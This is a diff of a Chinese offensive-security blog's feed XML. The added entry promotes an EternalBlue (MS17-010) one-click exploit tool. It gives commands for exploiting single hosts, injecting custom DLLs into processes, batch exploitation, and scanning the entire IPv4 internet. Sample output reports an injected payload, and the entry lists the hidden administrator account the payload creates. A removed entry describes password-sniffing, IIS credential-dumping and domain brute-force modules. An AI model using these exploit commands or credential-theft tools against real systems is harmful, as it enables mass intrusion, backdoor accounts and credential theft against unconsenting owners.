@@ -46,6 +46,34 @@
   </entry>
   
   <entry>
+    <title>MS17010-EXP 永恒之蓝一键工具</title>
+    <link href="http://k8gege.org/p/k8ms17010exp.html"/>
+    <id>http://k8gege.org/p/k8ms17010exp.html</id>
+    <published>2020-12-09T16:50:00.000Z</published>
+    <updated>2020-12-17T16:35:36.120Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>无损检测，不会对目标造成任何危害，大家无需担心</p><p>Ladon 192.168.1.8 MS17010<br>Ladon 192.168.1.8/24 MS17010<br>Ladon 192.168.1.8/c MS17010</p><h3 id="一键工具"><a href="#一键工具" class="headerlink" title="一键工具"></a>一键工具</h3><p>只需提供IP或IP列表即可自动利用永恒之蓝,当然也可以使用Ladon来批量甚至全网</p><h3 id="独立使用"><a href="#独立使用" class="headerlink" title="独立使用"></a>独立使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop\SmbExp&gt;ksmb 192.168.1.89</span><br><span class="line">MS17010-EXP ETERNALBLUE by K8gege</span><br><span class="line"></span><br><span class="line">IP:  192.168.1.89</span><br><span class="line">OS:  64-bit 6.1 build 7601     Windows 2008 R2 Enterprise 7601 SP 1</span><br><span class="line">VUL: 3 (ETERNALBLUE     - DANE  ETERNALROMANCE  - FB    ETERNALCHAMPION - DANE/F</span><br><span class="line">B)</span><br><span class="line">EXP: Use Eternalblue &amp; Doublepulsar</span><br><span class="line">DLL: x64 Payload Injected</span><br></pre></td></tr></table></figure><h4 id="只IP默认445端口"><a href="#只IP默认445端口" class="headerlink" title="只IP默认445端口"></a>只IP默认445端口</h4><p>ksmb 192.168.1.89</p><h4 id="自定义端口"><a href="#自定义端口" class="headerlink" title="自定义端口"></a>自定义端口</h4><p>ksmb 192.168.1.89 445</p><h4 id="自定义DLL"><a href="#自定义DLL" class="headerlink" title="自定义DLL"></a>自定义DLL</h4><p>ksmb 192.168.1.89 445 mydll.dll</p><h4 id="注入指定进程"><a href="#注入指定进程" class="headerlink" title="注入指定进程"></a>注入指定进程</h4><p>ksmb 192.168.1.89 445 mydll.dll explorer.exe</p><h3 id="Ladon调用"><a href="#Ladon调用" class="headerlink" title="Ladon调用"></a>Ladon调用</h3><h4 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h4><p>Ladon 192.168.1.89/c ksmb.exe<br>Ladon 192.168.1.89/24 ksmb.exe</p><h4 id="全网扫描"><a href="#全网扫描" class="headerlink" title="全网扫描"></a>全网扫描</h4><p>Ladon 0.0.0.0-255.255.255.255 ksmb.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop\SmbExp&gt;Ladon 192.168.1.89 ksmb.exe</span><br><span class="line">Ladon 7.5</span><br><span class="line">Start: 2020-12-17 23:40:16</span><br><span class="line">Runtime: .net 2.0  ME: x64 OS: x64</span><br><span class="line">OS Name: Microsoft Windows 8.1 Enterprise</span><br><span class="line">RunUser: null PR: -IsUser</span><br><span class="line">PID: 5804  CurrentProcess: Ladon</span><br><span class="line"></span><br><span class="line">Call DiyMoudle (c<span class="comment"># exe)</span></span><br><span class="line">load ksmb.exe</span><br><span class="line">ICMP: 192.168.1.89      00-0C-29-CF-FE-E1       VMware</span><br><span class="line">MS17010-EXP ETERNALBLUE by K8gege</span><br><span class="line"></span><br><span class="line">IP:  192.168.1.89</span><br><span class="line">OS:  64-bit 6.1 build 7601     Windows 2008 R2 Enterprise 7601 SP 1</span><br><span class="line">VUL: 3 (ETERNALBLUE     - DANE  ETERNALROMANCE  - FB    ETERNALCHAMPION - DANE/F</span><br><span class="line">B)</span><br><span class="line">EXP: Use Eternalblue &amp; Doublepulsar</span><br><span class="line">DLL: x64 Payload Injected</span><br></pre></td></tr></table></figure><h3 id="成功结果"><a href="#成功结果" class="headerlink" title="成功结果"></a>成功结果</h3><p>自带DLL会添加以下管理员用户<br>k8ms17010exp K8gege520!@#</p><p>可替换DLL，执行自定义功能</p><p><img alt="image" data-original="http://k8gege.org/k8img/exp/MS17010_EXP.PNG"></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒
+      
+    
+    </summary>
+    
+    
+      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
+    
+    
+      <category term="CVE-2020-17144" scheme="http://k8gege.org/tags/CVE-2020-17144/"/>
+    
+      <category term="MS17010" scheme="http://k8gege.org/tags/MS17010/"/>
+    
+  </entry>
+  
+  <entry>
     <title>LadonGo开源全平台渗透扫描器框架</title>
     <link href="http://k8gege.org/p/LadonGo.html"/>
     <id>http://k8gege.org/p/LadonGo.html</id>
@@ -193,9 +221,9 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
     
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
   </entry>
   
@@ -578,50 +606,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
       <category term=".NET" scheme="http://k8gege.org/tags/Dotnet/"/>
     
       <category term="SQL" scheme="http://k8gege.org/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破</title>
-    <link href="http://k8gege.org/p/56393.html"/>
-    <id>http://k8gege.org/p/56393.html</id>
-    <published>2020-06-11T16:20:10.000Z</published>
-    <updated>2020-10-13T13:57:53.581Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-6.0-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p><h3 id="Ladon6-0"><a href="#Ladon6-0" class="headerlink" title="Ladon6.0"></a>Ladon6.0</h3><p>新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、<br>进程详细信息获取、渗透相关信息获取、命令行参数信息<br>操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化</p><h3 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h3><table><thead><tr><th>动作</th><th>模块</th><th>说明</th></tr></thead><tbody><tr><td>新增</td><td>LdapScan</td><td>AD域密码爆破:基于Ldap协议爆破Windows密码</td></tr><tr><td>新增</td><td>FtpSniffer/SnifferFtp</td><td>Ftp密码嗅探(无需WinPcap)</td></tr><tr><td>新增</td><td>HttpSniffer/SnifferHTTP</td><td>HTTP密码嗅探(无需WinPcap)</td></tr><tr><td>新增</td><td>GetCmdLine/CmdLine</td><td>获取进程命令行参数/可指定进程</td></tr><tr><td>新增</td><td>GetInfo</td><td>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）</td></tr><tr><td>新增</td><td>GetInfo2</td><td>包含GetInfo &amp; Wmi获取信息</td></tr><tr><td>新增</td><td>Sniffer</td><td>网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址</td></tr><tr><td>新增</td><td>EnumIIS/IisWeb</td><td>获取IIS站点、路径、帐号、密码</td></tr><tr><td>新增</td><td>EnumProcess/ProcessList/tasklist</td><td>枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题)</td></tr><tr><td>更新</td><td>HttpDownload/wget</td><td>HTTP下载命令简化也可使用wget</td></tr><tr><td>更新</td><td>OsScan</td><td>扫描速度优化(某项目批量C段不再卡死)</td></tr><tr><td>更新</td><td>WmiScan</td><td>135端口关闭或RPC不可用停止爆破</td></tr><tr><td>更新</td><td>SmbScan</td><td>445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL)</td></tr><tr><td>移除</td><td>IPCScan</td><td>速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代</td></tr><tr><td>更新</td><td>所有模块</td><td>所有功能模块参数忽略大小写</td></tr></tbody></table><h3 id="LdapScan-AD域服务器密码爆破"><a href="#LdapScan-AD域服务器密码爆破" class="headerlink" title="LdapScan AD域服务器密码爆破"></a>LdapScan AD域服务器密码爆破</h3><p>非域内机器也可破解跨网段AD域服务器，LDAP端口为389<br>注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系<br>还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议<br>WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接<br>有时一个帐密各种协议方法都能连到远程机器只能说运气好<br>不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞<br>默认条件下都不能保证100%，更何况经过配置或出问题的系统<br><img alt="LdapScan" data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan_6.0.gif"></p><h3 id="FtpSniffer-FTP密码嗅探"><a href="#FtpSniffer-FTP密码嗅探" class="headerlink" title="FtpSniffer FTP密码嗅探"></a>FtpSniffer FTP密码嗅探</h3><p>支持两种写法: FtpSniffer/SnifferFtp<br>Example: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="FtpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/FtpSniffer.PNG"></p><h3 id="HttpSniffer-HTTP密码嗅探"><a href="#HttpSniffer-HTTP密码嗅探" class="headerlink" title="HttpSniffer HTTP密码嗅探"></a>HttpSniffer HTTP密码嗅探</h3><p>支持两种写法: HttpSniffer/SnifferHTTP<br>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="HttpSniffer" data-original="http://k8gege.org/k8img/Ladon/exe/HttpSniffer.PNG"></p><h3 id="Sniffer-网络嗅探"><a href="#Sniffer-网络嗅探" class="headerlink" title="Sniffer 网络嗅探"></a>Sniffer 网络嗅探</h3><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具</p><p>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p><p>Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡)<br><img alt="Sniffer" data-original="http://k8gege.org/k8img/Ladon/exe/Sniffer.PNG"></p><h3 id="EnumIIS-IIS站点密码读取"><a href="#EnumIIS-IIS站点密码读取" class="headerlink" title="EnumIIS IIS站点密码读取"></a>EnumIIS IIS站点密码读取</h3><p>获取IIS站点、路径、帐号、密码<br><img alt="EnumIIS" data-original="http://k8gege.org/k8img/Ladon/exe/EnumIIS.PNG"></p><h3 id="EnumProcess-进程详细信息获取"><a href="#EnumProcess-进程详细信息获取" class="headerlink" title="EnumProcess 进程详细信息获取"></a>EnumProcess 进程详细信息获取</h3><p>支持三种写法: EnumProcess/ProcessList/tasklist<br>结果(PID、Session、位数、进程名、用户名、路径、标题)<br><img alt="EnumProcess" data-original="http://k8gege.org/k8img/Ladon/exe/EnumProcess.PNG"></p><h3 id="GetCmdLine-进程启动参数"><a href="#GetCmdLine-进程启动参数" class="headerlink" title="GetCmdLine 进程启动参数"></a>GetCmdLine 进程启动参数</h3><p>进程启动参数/可指定进程<br>支持2种写法: GetCmdLine/CmdLine<br><img alt="getcmdline" data-original="http://k8gege.org/k8img/Ladon/exe/getcmdline.PNG"></p><h3 id="GetInfo-获取渗透基础信息"><a href="#GetInfo-获取渗透基础信息" class="headerlink" title="GetInfo 获取渗透基础信息"></a>GetInfo 获取渗透基础信息</h3><p>获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）<br>GetInfo2 包含GetInfo &amp; Wmi获取的相关信息</p><h3 id="全部功能"><a href="#全部功能" class="headerlink" title="全部功能"></a>全部功能</h3><p><a href="http://k8gege.org/p/648af4b3.html">http://k8gege.org/p/648af4b3.html</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://github.com/k8gege&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img alt=&quot;Author&quot; data-original=&quot;https://img.shields.io/badge/Author-k
-      
-    
-    </summary>
-    
-    
-      <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-      <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
-    
-      <category term="嗅探" scheme="http://k8gege.org/categories/Sniffer/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
-      <category term="Sniffer" scheme="http://k8gege.org/tags/Sniffer/"/>
-    
-      <category term="FtpSniffer" scheme="http://k8gege.org/tags/FtpSniffer/"/>
-    
-      <category term="HttpSniffer" scheme="http://k8gege.org/tags/HttpSniffer/"/>
-    
-      <category term="IIS" scheme="http://k8gege.org/tags/IIS/"/>
-    
-      <category term="LDAP" scheme="http://k8gege.org/tags/LDAP/"/>
     
   </entry>
   
